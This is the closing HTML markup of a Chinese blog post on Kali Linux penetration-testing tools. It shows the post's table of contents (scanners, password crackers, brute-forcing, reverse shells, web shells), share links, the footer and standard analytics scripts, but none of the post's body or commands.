+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Catalog"><span class="toc-number">1.</span> <span class="toc-text">Catalog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">开机配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali-2020-1%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%8A%A5%E9%94%99%E3%80%81%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E3%80%81%E6%81%A2%E5%A4%8D%E5%8F%AF%E8%A7%86%E5%8C%96%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3"><span class="toc-number">2.0.1.</span> <span class="toc-text">Kali 2020.1版本安装报错、中文乱码问题、恢复可视化界面，如何解决</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">各种工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E7%9E%84%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95-dirb"><span class="toc-number">3.0.1.</span> <span class="toc-text">扫瞄网站目录 dirb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E6%89%AB%E6%8F%8F"><span class="toc-number">3.0.2.</span> <span class="toc-text">DNS 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85-rarcrack"><span class="toc-number">3.0.3.</span> <span class="toc-text">爆破压缩包 rarcrack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.0.4.</span> <span class="toc-text">生成字典工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#john-%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="toc-number">3.0.5.</span> <span class="toc-text">john 破解工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hydra-%E7%88%86%E7%A0%B4-Web-%E7%99%BB%E5%BD%95%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81SSH%E3%80%81FTP%E7%AD%89%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.0.6.</span> <span class="toc-text">Hydra 爆破 Web 登录、数据库、SSH、FTP等服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E%E5%BA%93-usr-share-exploitdb"><span class="toc-number">3.0.7.</span> <span class="toc-text">kali 本地漏洞库:&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-nikto-%E6%96%87%E6%A1%A3%E8%AF%B4%E6%98%8Ehttps-cirt-net-nikto2-docs"><span class="toc-number">3.0.8.</span> <span class="toc-text">漏洞扫描 nikto  文档说明https:&#x2F;&#x2F;cirt.net&#x2F;nikto2-docs&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fsociety-Hacking-Tools-Pack-%E4%B8%80%E6%AC%BE%E4%B8%93%E4%B8%9A%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6"><span class="toc-number">3.0.9.</span> <span class="toc-text">Fsociety Hacking Tools Pack-一款专业的渗透测试框架</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">3.0.10.</span> <span class="toc-text">各种反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE-UA"><span class="toc-number">3.0.11.</span> <span class="toc-text">内置 UA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E8%8F%9C%E5%88%80%F0%9F%94%AA"><span class="toc-number">3.0.12.</span> <span class="toc-text">kali 菜刀🔪</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#webacoo"><span class="toc-number">3.0.12.0.1.</span> <span class="toc-text">webacoo</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#weebely"><span class="toc-number">3.0.12.0.2.</span> <span class="toc-text">weebely</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F-%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC"><span class="toc-number">3.0.13.</span> <span class="toc-text">扫描+漏洞版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hacker-%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">3.0.14.</span> <span class="toc-text">Hacker 的网站</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/12/28/Kali/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/12/28/Kali/&text=Kali_自我修养（持续更新）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/12/28/Kali/&is_video=false&description=Kali_自我修养（持续更新）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kali_自我修养（持续更新）&body=Check out this article: http://ybm911.work/2020/12/28/Kali/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/12/28/Kali/&name=Kali_自我修养（持续更新）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/12/28/Kali/&t=Kali_自我修养（持续更新）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
